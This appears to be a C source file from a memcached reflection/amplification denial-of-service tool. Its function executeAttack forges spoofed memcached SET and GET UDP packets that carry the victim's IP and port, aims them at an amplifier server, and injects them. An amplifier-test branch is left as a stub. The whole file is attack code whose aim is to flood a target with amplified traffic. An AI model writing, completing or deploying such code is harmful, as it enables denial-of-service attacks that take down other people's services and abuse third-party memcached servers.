#include "c.h"
#include "packetforge.h"
#include "memcached.h"
#include "strix.h"
#include "netbasic.h"
#include "injector.h"

void 
executeAttack( AttackPlan * plan )
{
  AttackData * atkData;

  memalloc( (void *)&atkData, sizeof( AttackData ), __func__);
  
  atkData->atkPlan = plan;
   
  atkData->setPacket = ForgeMemcachedUDP( plan->amp_ip, plan->target_ip, plan->target_port, plan->amp_port, MEMCACHED_SET );

  atkData->getPacket = ForgeMemcachedUDP( plan->amp_ip, plan->target_ip, plan->target_port, plan->amp_port, MEMCACHED_GET );
  
  if( !plan->ampTest ){
    inject( atkData );
  }else{
    //call amplifier test
  }

  release_packet( &atkData->setPacket);
  release_packet( &atkData->getPacket);
  free( atkData );
  
}



